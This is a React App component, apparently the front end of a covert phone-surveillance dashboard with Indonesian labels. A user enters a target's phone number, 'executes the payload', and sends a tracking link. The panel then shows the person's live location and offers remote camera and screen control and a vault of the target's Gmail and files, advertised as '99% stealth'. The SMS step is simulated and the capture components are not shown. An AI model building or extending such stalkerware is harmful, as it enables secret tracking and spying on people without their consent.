
import React, { useState, useEffect } from 'react';
import Sidebar from './components/layout/Sidebar';
import Header from './components/layout/Header';
import LiveMap from './components/LiveMap';
import TrackerClient from './components/TrackerClient';
import Terminal from './components/Terminal';
import SensorHub from './components/SensorHub';
import DataVault from './components/DataVault';
import Blueprints from './components/Blueprints';
import Compliance from './components/Compliance';
import LandingPage from './components/LandingPage';
import LoginPage from './components/LoginPage';
import AIAssistant from './components/AIAssistant';

import { onLocationUpdate, TrackingData } from './services/realtime';
import { analyzeMovementPattern } from './services/ai.service';
import { Device, DeviceStatus } from './types';
import { 
  Activity, Send, Phone, MapPin, ExternalLink, 
  Info, Target, Terminal as TerminalIcon, 
  Globe, Fingerprint, Zap, Crosshair
} from 'lucide-react';

const App: React.FC = () => {
  const [isAuthenticated, setIsAuthenticated] = useState<boolean>(() => {
    return localStorage.getItem('shdw_auth') === 'true';
  });
  const [showLogin, setShowLogin] = useState(false);
  const [sessionId, setSessionId] = useState<string | null>(null);
  const [activeTab, setActiveTab] = useState('dashboard');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [isSendingSms, setIsSendingSms] = useState(false);
  const [trackingSession, setTrackingSession] = useState<{id: string, phone: string} | null>(null);
  const [liveTrackingData, setLiveTrackingData] = useState<TrackingData | null>(null);
  const [aiAnalysis, setAiAnalysis] = useState<string>("");
  const [isAnalyzing, setIsAnalyzing] = useState(false);
  const [vaultCategory, setVaultCategory] = useState<'gmail' | 'files'>('gmail');

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const session = params.get('session');
    if (session) setSessionId(session);
  }, []);

  useEffect(() => {
    const cleanup = onLocationUpdate((data) => setLiveTrackingData(data));
    return cleanup;
  }, []);

  const handleLoginSuccess = () => {
    setIsAuthenticated(true);
    localStorage.setItem('shdw_auth', 'true');
    setShowLogin(false);
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    localStorage.removeItem('shdw_auth');
    setActiveTab('dashboard');
  };

  const handleStartTracking = (num?: string) => {
    const targetNum = num || phoneNumber;
    if (!targetNum || targetNum.length < 8) return;
    if (num) setPhoneNumber(targetNum);
    setIsSendingSms(true);
    setTimeout(() => {
      setTrackingSession({ id: 'shdw_' + Math.random().toString(36).slice(2, 9), phone: targetNum });
      setIsSendingSms(false);
      setActiveTab('devices');
    }, 1500);
  };

  const handleAIControlSensor = (type: 'camera' | 'screen', action: 'start' | 'stop') => {
    setActiveTab('sensors');
    setTimeout(() => {
      window.dispatchEvent(new CustomEvent('control-sensor', { detail: { type, action } }));
    }, 200);
  };

  if (sessionId) return <TrackerClient sessionId={sessionId} />;

  if (!isAuthenticated) {
    return showLogin ? (
      <LoginPage onLoginSuccess={handleLoginSuccess} onBack={() => setShowLogin(false)} />
    ) : (
      <LandingPage onEnter={() => setShowLogin(true)} />
    );
  }

  return (
    <div className="min-h-screen bg-[#050505] flex scanline-effect overflow-hidden">
      <Sidebar activeTab={activeTab} setActiveTab={setActiveTab} />
      
      <main className="flex-1 ml-20 lg:ml-64 flex flex-col h-screen relative transition-all duration-300">
        <Header activeTab={activeTab} onLogout={handleLogout} />

        <div className="flex-1 overflow-y-auto p-8 bg-[radial-gradient(circle_at_50%_50%,rgba(6,182,212,0.03),transparent)]">
          {activeTab === 'dashboard' && (
            <div className="grid grid-cols-12 gap-6 h-full animate-in fade-in duration-500">
              <div className="col-span-12 lg:col-span-5 flex flex-col gap-6">
                <div className="bg-[#0f172a]/40 border border-white/5 rounded-2xl p-8 glass relative group">
                  <div className="flex items-center gap-3 mb-8">
                    <div className="w-12 h-12 bg-white/5 rounded flex items-center justify-center text-cyan-400 border border-cyan-500/20 shadow-[0_0_15px_rgba(6,182,212,0.1)]">
                      <Phone size={24} />
                    </div>
                    <div>
                      <h3 className="font-black text-white text-lg tracking-widest mono uppercase italic">Infiltrasi_Target</h3>
                    </div>
                  </div>
                  <div className="space-y-6">
                    <div className="relative">
                      <span className="absolute left-5 top-1/2 -translate-y-1/2 font-black text-cyan-500 mono text-sm">+62</span>
                      <input 
                        type="tel" 
                        className="w-full pl-16 pr-5 py-5 bg-black/40 border border-white/10 rounded-xl mono text-white"
                        value={phoneNumber}
                        onChange={(e) => setPhoneNumber(e.target.value.replace(/\D/g, ''))}
                      />
                    </div>
                    <button 
                      onClick={() => handleStartTracking()}
                      disabled={isSendingSms}
                      className="w-full py-5 bg-cyan-600 text-black font-black rounded-xl mono uppercase tracking-[0.2em]"
                    >
                      {isSendingSms ? 'MENYEBARKAN...' : 'EKSEKUSI_PAYLOAD'}
                    </button>
                  </div>
                </div>
                <div className="flex-1"><Terminal /></div>
              </div>
              <div className="col-span-12 lg:col-span-7 flex flex-col gap-6">
                 <div className="grid grid-cols-2 gap-6">
                    <div className="bg-white/5 border border-white/5 rounded-2xl p-6 glass">
                       <Globe size={18} className="text-cyan-500 mb-4" />
                       <div className="text-2xl font-black text-white mono italic">1,842 <span className="text-cyan-500 text-xs uppercase">Online</span></div>
                    </div>
                    <div className="bg-white/5 border border-white/5 rounded-2xl p-6 glass">
                       <Fingerprint size={18} className="text-rose-500 mb-4" />
                       <div className="text-2xl font-black text-white mono italic">99% <span className="text-rose-500 text-xs uppercase">Stealth</span></div>
                    </div>
                 </div>
              </div>
            </div>
          )}

          {activeTab === 'sensors' && <SensorHub />}
          {activeTab === 'vault' && <DataVault initialCategory={vaultCategory} />}
          {activeTab === 'blueprints' && <Blueprints />}
          {activeTab === 'compliance' && <Compliance />}

          {activeTab === 'devices' && (
            <div className="grid grid-cols-12 gap-6 h-[calc(100vh-160px)]">
              <div className="col-span-12 lg:col-span-4 flex flex-col gap-6">
                <div className="bg-[#0f172a]/40 glass border border-white/5 rounded-2xl p-6 h-full">
                  <h3 className="font-black text-white mono text-xs tracking-[0.4em] mb-6 uppercase">Intel_Target</h3>
                  {trackingSession && (
                    <div className="space-y-6">
                      <div className="bg-black/60 p-5 rounded-xl border border-white/5">
                        <p className="text-[9px] text-slate-500 mono font-black uppercase mb-2">Telepon_Target</p>
                        <p className="text-2xl font-black text-white mono italic tracking-tighter">+62 {trackingSession.phone.slice(0, 3)} XXXX</p>
                      </div>
                      {!liveTrackingData ? (
                        <button onClick={() => window.open(`./?session=${trackingSession.id}`, '_blank')} className="w-full py-4 border border-cyan-500/30 text-cyan-400 rounded-xl font-black mono text-xs uppercase">Buka Gerbang</button>
                      ) : (
                        <button className="w-full py-5 bg-white text-black rounded-xl font-black mono text-[10px] uppercase">Analisis_Taktis</button>
                      )}
                    </div>
                  )}
                </div>
              </div>
              <div className="col-span-12 lg:col-span-8 bg-black rounded-2xl border border-white/5 overflow-hidden relative">
                 <LiveMap trackingData={liveTrackingData} />
              </div>
            </div>
          )}
        </div>
        <AIAssistant 
          onNavigate={setActiveTab} 
          onTrack={handleStartTracking}
          onSensor={handleAIControlSensor}
          onVault={(cat) => { setActiveTab('vault'); setVaultCategory(cat); }}
        />
      </main>
    </div>
  );
};

export default App;
